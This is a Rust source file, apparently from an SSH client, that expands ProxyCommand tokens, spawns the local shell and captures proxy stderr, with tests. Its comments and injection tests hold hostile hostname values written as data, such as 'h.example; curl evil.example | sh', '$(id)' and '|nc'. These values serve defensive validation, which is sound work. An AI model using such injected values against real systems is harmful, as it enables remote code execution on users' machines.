//! Turning a stored `ProxyCommand` line into a running local process.
//!
//! Two things live here that `proxy_command` used to do inline, and got
//! wrong in the same way on the same platform:
//!
//! 1. **Token expansion.** OpenSSH resolves `%h` / `%n` / `%p` / `%r`
//!    against the host being dialed before it hands the line to a shell
//!    (`ssh_config(5)`: "ProxyCommand and ProxyJump accept the tokens
//!    %%, %h, %n, %p, and %r"). Oryxis did not, so an imported
//!    `~/.ssh/config` entry, whose ProxyCommand almost always carries
//!    those tokens, reached the shell with the literal text `%h` where
//!    the target belonged. Nothing downstream could recover from that:
//!    `aws ssm start-session --target %h` asks SSM for an instance
//!    named `%h`.
//!
//! 2. **The shell.** `sh -c` is the Unix spelling and only that. A
//!    stock Windows box has no `sh` anywhere on `PATH`, so every command
//!    proxy on Windows died in `CreateProcess` before the line was even
//!    parsed. `cmd.exe` is the local equivalent (and what Win32-OpenSSH
//!    reaches for), with the quoting rule below to get a line through it
//!    intact.
//!
//! Expansion happens AFTER the approval gate in `proxy_command`, never
//! before: what the user approved, and what `proxy_command_fingerprint`
//! hashes, is the stored line with its tokens still in it. Substituting
//! first would mint a new fingerprint per target and re-prompt on every
//! host that shares one proxy identity.
//!
//! That ordering is also why the values that go in are checked rather
//! than trusted. The line is approved once; the values it is expanded
//! with arrive per dial, and a sync peer writes hostnames verbatim. A
//! host of `x; curl evil.example | sh` would otherwise turn one
//! approval into a different process every time the peer edited the
//! host. So a substituted value may only be the shape of a host or a
//! login name, and a dial carrying anything else stops here instead of
//! reaching a shell.

use std::collections::VecDeque;
use std::process::Stdio;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::{Child, Command as TokioCommand};
use tokio::task::JoinHandle;

use super::auth::effective_username;
use super::{Connection, ProxyCommandError};

/// What a `ProxyCommand` line can name about one dial.
///
/// The four tokens OpenSSH resolves in a ProxyCommand, taken from the
/// connection being dialed rather than from a second opinion about it:
/// `%r` is the login the auth path will actually send, and `%n` is the
/// name the user knows the host by.
pub(crate) struct ProxyTokens<'a> {
    /// `%h`, the host being dialed.
    pub host: &'a str,
    /// `%p`, the port being dialed.
    pub port: u16,
    /// `%r`, the login this dial authenticates as.
    pub user: &'a str,
    /// `%n`, the name the user knows this host by. For a host imported
    /// from `~/.ssh/config` that IS the `Host` alias (`SshConfigHost`
    /// carries the alias into the connection label), which is exactly
    /// what OpenSSH puts here.
    pub name: &'a str,
}

impl<'a> ProxyTokens<'a> {
    /// The tokens for dialing `conn`.
    ///
    /// `%r` goes through `effective_username`, the same function the
    /// auth path calls, so a line cannot be told about a user the
    /// session never logs in as.
    pub(crate) fn for_dial(conn: &'a Connection) -> Self {
        Self {
            host: &conn.hostname,
            port: conn.port,
            user: effective_username(conn),
            name: &conn.label,
        }
    }
}

/// Everything a substituted value is allowed to contain.
///
/// The set is the union of what a host can be (DNS labels, IPv4, an
/// IPv6 literal, an EC2 instance id) and what a login name can be, and
/// deliberately nothing else. Nothing in it is a word separator, a
/// quote, a glob or an operator in the shell the value lands in, so a
/// value that passes can fill a slot but cannot restructure the line
/// around it.
///
/// Two characters are missing that a first reading would put in, and
/// both were measured rather than assumed:
///
/// - `\` is in the set on Windows and out of it on unix. It is inert to
///   `cmd.exe` and carries the `DOMAIN\user` spelling that only exists
///   there, while `sh` reads it as an escape: `ssh -l DOMAIN\user`
///   arrives as `DOMAINuser`, and a value ending in one splices the
///   next word onto itself (`nc host\ 22` is one argument, `host 22`).
///   Neither is an injection, both are the line quietly meaning
///   something else.
/// - `[` and `]` are in neither. `sh` globs them, so an unquoted
///   `[2001:db8::1]` expands against the working directory the moment a
///   single-character file name matches one. `%h` accepts the bracketed
///   spelling anyway and substitutes the address inside it, which is
///   what OpenSSH's own `%h` would have been.
fn is_substitutable(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 255
        && value.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, '.' | '-' | '_' | ':' | '@' | '/' | '+')
                || (cfg!(windows) && c == '\\')
        })
}

/// Strip the authority-form brackets off an IPv6 literal.
///
/// `oryxis_core::net::host_port` adds them when it builds an address,
/// and a user may well have typed them into the host field, but
/// OpenSSH's `%h` is the bare `HostName`. Only a matched pair is
/// stripped, so a half-bracketed value stays malformed and is refused
/// by `is_substitutable` rather than half-repaired here.
fn unbracket(host: &str) -> &str {
    host.strip_prefix('[')
        .and_then(|inner| inner.strip_suffix(']'))
        .unwrap_or(host)
}

fn checked<'a>(token: &'static str, value: &'a str) -> Result<&'a str, ProxyCommandError> {
    if is_substitutable(value) {
        Ok(value)
    } else {
        Err(ProxyCommandError::UnsafeValue {
            token,
            value: value.to_string(),
        })
    }
}

/// Resolve OpenSSH's ProxyCommand tokens against `tokens`.
///
/// `%%` is a literal `%`. Any other `%x` is left exactly as written:
/// Oryxis implements the four tokens `ssh_config(5)` lists for a
/// ProxyCommand, and a Windows line referring to `%USERPROFILE%` or
/// `%ComSpec%` must reach `cmd.exe` with its environment references
/// intact.
pub(crate) fn expand_proxy_tokens(
    cmd: &str,
    tokens: &ProxyTokens<'_>,
) -> Result<String, ProxyCommandError> {
    if !cmd.contains('%') {
        return Ok(cmd.to_string());
    }
    let port = tokens.port.to_string();
    let mut out = String::with_capacity(cmd.len() + 16);
    let mut chars = cmd.chars();
    while let Some(c) = chars.next() {
        if c != '%' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('%') => out.push('%'),
            Some('h') => out.push_str(checked("%h", unbracket(tokens.host))?),
            Some('p') => out.push_str(&port),
            Some('r') => out.push_str(checked("%r", tokens.user)?),
            Some('n') => out.push_str(checked("%n", tokens.name)?),
            Some(other) => {
                out.push('%');
                out.push(other);
            }
            // A line ending in a bare `%` is not a token; keep it.
            None => out.push('%'),
        }
    }
    Ok(out)
}

/// The local shell, holding an already-expanded line.
#[cfg(unix)]
fn shell_command(line: &str) -> TokioCommand {
    let mut cmd = TokioCommand::new("sh");
    cmd.arg("-c").arg(line);
    cmd
}

/// The local shell, holding an already-expanded line.
///
/// `cmd.exe` has two rules for the text after `/C`, and picks between
/// them by counting quotes: a line with one quoted argument keeps its
/// quotes, a line with more than one gets its first and last quote
/// stripped. A ProxyCommand routinely has both an interpreter path in
/// `Program Files` and a quoted parameter, which lands it in the second
/// rule and mangles it. `/S` settles the question: it forces the
/// strip-the-outer-pair rule always, so wrapping the whole line in one
/// added pair delivers it verbatim no matter what is inside.
///
/// It has to go through `raw_arg`. Rust quotes a normal `arg` for the
/// MSVC runtime's parser, which `cmd.exe` does not use, and the escaping
/// it adds is what the shell would then choke on.
#[cfg(windows)]
fn shell_command(line: &str) -> TokioCommand {
    use std::os::windows::process::CommandExt;
    use std::path::{Path, PathBuf};

    // Oryxis is a GUI process, so a `cmd.exe` child would otherwise
    // flash a console window on every dial through a command proxy.
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    // `ComSpec`, then the fixed system path, and a bare name only as a
    // last resort: an unqualified `cmd.exe` is resolved by
    // `CreateProcess` against a search path a dropped file can sit in,
    // and this spawn already runs before any handshake. Same shape as
    // the engine's other fixed-path probes (`~/.ssh/pageant.conf` in
    // `engine::agent`, `~/.Xauthority` in `x11::xauth`): an explicit
    // value wins, a fixed path is the fallback.
    let comspec = std::env::var_os("ComSpec")
        .map(PathBuf::from)
        .or_else(|| {
            std::env::var_os("SystemRoot")
                .map(|root| Path::new(&root).join("System32").join("cmd.exe"))
        })
        .unwrap_or_else(|| PathBuf::from("cmd.exe"));

    let mut cmd = TokioCommand::new(comspec);
    cmd.as_std_mut().raw_arg(format!("/S /C \"{line}\""));
    cmd.creation_flags(CREATE_NO_WINDOW);
    cmd
}

/// Spawn an expanded proxy line with its three pipes wired.
///
/// The child is deliberately not `kill_on_drop`: `proxy_command` keeps
/// the pipes and lets the `Child` go, and the proxy ends when the SSH
/// session drops its end of stdin.
pub(crate) fn spawn_proxy_process(line: &str) -> std::io::Result<Child> {
    let mut cmd = shell_command(line);
    cmd.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        // Piped, not null. A command proxy fails for ordinary reasons,
        // an expired SSO token, a binary that moved, a region that does
        // not host the target, and it says so on stderr. Discarding that
        // left the user with an unexplained EOF during version exchange
        // and nothing anywhere to explain it.
        .stderr(Stdio::piped());
    cmd.spawn()
}

/// A command proxy's own account of itself.
///
/// Shared between the task draining its stderr and the dial that may
/// have to explain a failure, because the two learn about that failure
/// on different pipes: russh sees an EOF on stdout, and the sentence
/// saying why is on the other one.
#[derive(Clone, Default)]
pub(crate) struct ProxyStderr {
    tail: Arc<Mutex<VecDeque<String>>>,
    drain: Arc<Mutex<Option<JoinHandle<()>>>>,
}

impl ProxyStderr {
    /// How many lines travel in the dial error. Enough for a stack of
    /// "token expired" plus the "run `aws sso login`" under it, short
    /// enough that the connect card stays a card.
    const TAIL: usize = 5;

    /// How long a failing dial waits for the complaint to arrive. The
    /// proxy that just died has closed its stderr, so the drain ends on
    /// its own and this resolves at once; the cap is for the proxy that
    /// is still alive and simply had nothing more to say.
    const SETTLE: Duration = Duration::from_millis(250);

    fn push(&self, line: String) {
        let mut tail = self.tail.lock().unwrap_or_else(|e| e.into_inner());
        if tail.len() == Self::TAIL {
            tail.pop_front();
        }
        tail.push_back(line);
    }

    fn lines(&self) -> Vec<String> {
        self.tail
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .iter()
            .cloned()
            .collect()
    }

    /// The proxy's last words, after giving the drain a moment to catch
    /// up.
    ///
    /// Dropping the join handle on timeout DETACHES the drain rather
    /// than aborting it, which is what it has to do: a proxy still
    /// running needs its stderr kept open (see `drain_proxy_stderr`).
    pub(crate) async fn settled_tail(&self) -> Vec<String> {
        let handle = self.drain.lock().unwrap_or_else(|e| e.into_inner()).take();
        if let Some(handle) = handle {
            let _ = tokio::time::timeout(Self::SETTLE, handle).await;
        }
        self.lines()
    }
}

/// Start draining a command proxy's stderr, and hand back the sink the
/// dial reads its last words from.
pub(crate) fn watch_proxy_stderr(
    stderr: tokio::process::ChildStderr,
    host: String,
    port: u16,
) -> ProxyStderr {
    let sink = ProxyStderr::default();
    let handle = tokio::spawn(drain_proxy_stderr(stderr, host, port, sink.clone()));
    *sink.drain.lock().unwrap_or_else(|e| e.into_inner()) = Some(handle);
    sink
}

/// Copy a command proxy's own diagnostics somewhere they can be read.
///
/// Two jobs, and the second is why this loop never stops early. The
/// first `LOGGED_LINES` go to the log, which is the offline account of
/// why a dial failed; EVERY line updates `sink`, so the dial error
/// carries the proxy's last words rather than its first.
///
/// The reader stays open for as long as the proxy runs. Dropping it
/// once a budget ran out would close the pipe under a still-running
/// proxy, and on unix the next thing it wrote would die of SIGPIPE: a
/// chatty proxy (a progress meter, a retry loop) would take a live
/// session down with it once it passed the cap.
///
/// One thing worth knowing about the log half: this is the proxy's own
/// output, not its command line, and a CLI that fails by printing its
/// usage prints its arguments with it. The line itself is still kept
/// out of the log on purpose (it can embed credentials), but a proxy
/// determined to echo its own can defeat that, which is the price of
/// having any account at all of why a dial failed.
async fn drain_proxy_stderr(
    stderr: tokio::process::ChildStderr,
    host: String,
    port: u16,
    sink: ProxyStderr,
) {
    const LOGGED_LINES: usize = 32;
    let mut lines = BufReader::new(stderr).lines();
    let mut logged = 0usize;
    while let Ok(Some(line)) = lines.next_line().await {
        if line.trim().is_empty() {
            continue;
        }
        sink.push(line.clone());
        if logged >= LOGGED_LINES {
            continue;
        }
        logged += 1;
        tracing::warn!(
            target: "oryxis::ssh::proxy",
            %host,
            port,
            "command proxy: {}",
            line
        );
        if logged == LOGGED_LINES {
            tracing::warn!(
                target: "oryxis::ssh::proxy",
                %host,
                port,
                "command proxy: further output is kept for the dial error but no longer logged"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tokens<'a>(host: &'a str, port: u16, user: &'a str, name: &'a str) -> ProxyTokens<'a> {
        ProxyTokens {
            host,
            port,
            user,
            name,
        }
    }

    fn host_only(host: &str, port: u16) -> ProxyTokens<'_> {
        tokens(host, port, "root", "the-host")
    }

    #[test]
    fn the_ssm_line_from_ssh_config_expands() {
        // Verbatim shape of the AWS-documented ProxyCommand, which is
        // the case that sent this module into existence.
        let line = "aws ssm start-session --target %h \
                    --document-name AWS-StartSSHSession --parameters portNumber=%p";
        let out = expand_proxy_tokens(line, &host_only("i-00cfa8b4282a0b658", 22)).unwrap();
        assert_eq!(
            out,
            "aws ssm start-session --target i-00cfa8b4282a0b658 \
             --document-name AWS-StartSSHSession --parameters portNumber=22"
        );
    }

    #[test]
    fn every_token_ssh_config_lists_resolves() {
        // The four from `ssh_config(5)`: "ProxyCommand and ProxyJump
        // accept the tokens %%, %h, %n, %p, and %r."
        let out = expand_proxy_tokens(
            "helper --alias %n --user %r --to %h:%p",
            &tokens("db.internal", 2222, "deploy", "db"),
        )
        .unwrap();
        assert_eq!(out, "helper --alias db --user deploy --to db.internal:2222");
    }

    #[test]
    fn a_doubled_percent_is_one_literal_percent() {
        let out =
            expand_proxy_tokens("run --pct 50%% --to %h", &host_only("h.example", 22)).unwrap();
        assert_eq!(out, "run --pct 50% --to h.example");
    }

    #[test]
    fn an_unknown_token_survives_untouched() {
        // A Windows line has environment references in it and they are
        // the shell's business, not ours.
        let out =
            expand_proxy_tokens("%ComSpec% /c helper %h", &host_only("h.example", 22)).unwrap();
        assert_eq!(out, "%ComSpec% /c helper h.example");
    }

    #[test]
    fn a_line_without_tokens_is_returned_as_written() {
        let line = "cloudflared access ssh --hostname fixed.example";
        assert_eq!(expand_proxy_tokens(line, &host_only("h", 22)).unwrap(), line);
    }

    #[test]
    fn an_ipv6_literal_loses_its_brackets_and_keeps_its_address() {
        // Both spellings reach `%h`, and neither may reach `sh` with a
        // glob in it.
        for spelling in ["[2001:db8::1]", "2001:db8::1"] {
            let out = expand_proxy_tokens("nc %h %p", &host_only(spelling, 22)).unwrap();
            assert_eq!(out, "nc 2001:db8::1 22", "for {spelling:?}");
        }
    }

    #[test]
    fn a_half_bracketed_host_is_refused_rather_than_repaired() {
        let err = expand_proxy_tokens("nc %h %p", &host_only("[2001:db8::1", 22)).unwrap_err();
        assert!(matches!(
            err,
            ProxyCommandError::UnsafeValue { token: "%h", .. }
        ));
    }

    #[test]
    fn a_hostname_that_could_run_a_command_is_refused() {
        // The approval covers the line, not the host it is expanded
        // with, so this is the one that has to fail closed.
        for hostile in [
            "h.example; curl evil.example | sh",
            "h.example`id`",
            "h.example$(id)",
            "h.example&calc",
            "h example",
            "h.example\"",
            "h.example'",
            "h.example|nc",
            "h.example\nsecond",
        ] {
            let err = expand_proxy_tokens("nc %h %p", &host_only(hostile, 22)).unwrap_err();
            assert!(
                matches!(err, ProxyCommandError::UnsafeValue { token: "%h", .. }),
                "expected a refusal for {hostile:?}, got {err:?}"
            );
        }
    }

    #[test]
    fn a_username_that_could_run_a_command_is_refused() {
        let err = expand_proxy_tokens(
            "ssh -l %r bastion",
            &tokens("h.example", 22, "a;id", "the-host"),
        )
        .unwrap_err();
        assert!(matches!(
            err,
            ProxyCommandError::UnsafeValue { token: "%r", .. }
        ));
    }

    #[test]
    fn a_connection_label_that_is_not_a_name_is_refused() {
        // `%n` is the connection's own label, which is free text a user
        // types ("My Server"). It fills a slot or it stops the dial; it
        // never reaches a shell with a space in it.
        let err = expand_proxy_tokens(
            "helper --alias %n",
            &tokens("h.example", 22, "root", "My Server"),
        )
        .unwrap_err();
        assert!(matches!(
            err,
            ProxyCommandError::UnsafeValue { token: "%n", .. }
        ));
    }

    /// The escape half of the allowlist, which is platform-split
    /// because `\` means two different things.
    #[test]
    fn a_backslash_login_is_a_windows_spelling_only() {
        let out = expand_proxy_tokens(
            "ssh -l %r bastion",
            &tokens("h.example", 22, "CORP\\deploy", "the-host"),
        );
        if cfg!(windows) {
            // Inert to `cmd.exe`, and the only shell that spelling
            // belongs to.
            assert_eq!(out.unwrap(), "ssh -l CORP\\deploy bastion");
        } else {
            // `sh` would eat the backslash and hand the proxy
            // `CORPdeploy`, a different user, silently.
            assert!(matches!(
                out.unwrap_err(),
                ProxyCommandError::UnsafeValue { token: "%r", .. }
            ));
        }
    }

    #[tokio::test]
    async fn the_local_shell_runs_a_line_and_hands_back_its_output() {
        // The platform half: whatever `shell_command` picked has to
        // actually exist and actually run the line. This is the
        // assertion that was missing on Windows, where `sh` never did.
        use tokio::io::AsyncReadExt;

        let mut child = spawn_proxy_process("echo oryxis-proxy-ok").expect("proxy spawn");
        let mut out = String::new();
        child
            .stdout
            .take()
            .expect("stdout")
            .read_to_string(&mut out)
            .await
            .expect("read");
        assert!(
            out.contains("oryxis-proxy-ok"),
            "shell did not run the line, got {out:?}"
        );
    }

    #[tokio::test]
    async fn a_quoted_interpreter_path_with_spaces_survives_the_shell() {
        // The Windows quoting rule this module exists to get right: a
        // line with more than one quoted run used to come out of
        // `cmd.exe` with its first and last quote gone.
        #[cfg(windows)]
        let line = r#""C:\Windows\System32\cmd.exe" /c echo "a b" c"#;
        #[cfg(unix)]
        let line = r#"/bin/echo "a b" c"#;

        use tokio::io::AsyncReadExt;
        let mut child = spawn_proxy_process(line).expect("proxy spawn");
        let mut out = String::new();
        child
            .stdout
            .take()
            .expect("stdout")
            .read_to_string(&mut out)
            .await
            .expect("read");
        assert!(out.contains("a b"), "quoting was mangled, got {out:?}");
    }

    /// A proxy that talks past the log budget must survive it, and the
    /// dial must get its LAST words rather than its first.
    ///
    /// Unix-only for a reason this time, and not the one the old
    /// `#[cfg(unix)]` in `engine::tests` had: the regression is SIGPIPE,
    /// which is a unix signal. A Windows proxy writing to a closed pipe
    /// gets an error back and decides for itself what to do with it.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_proxy_that_outtalks_the_log_budget_is_not_killed_by_it() {
        let mut child = spawn_proxy_process(
            "i=0; while [ $i -lt 200 ]; do echo chatter $i >&2; i=$((i+1)); done; \
             echo the-last-word >&2; echo done",
        )
        .expect("proxy spawn");

        let stderr = child.stderr.take().expect("stderr");
        let sink = watch_proxy_stderr(stderr, "host.example".to_string(), 22);

        let status = child.wait().await.expect("wait");
        assert!(status.success(), "the proxy died talking, status {status:?}");

        let tail = sink.settled_tail().await;
        assert_eq!(
            tail.last().map(String::as_str),
            Some("the-last-word"),
            "the dial gets the proxy's last words, got {tail:?}"
        );
        assert!(
            tail.len() <= ProxyStderr::TAIL,
            "tail is capped, got {tail:?}"
        );
    }
}
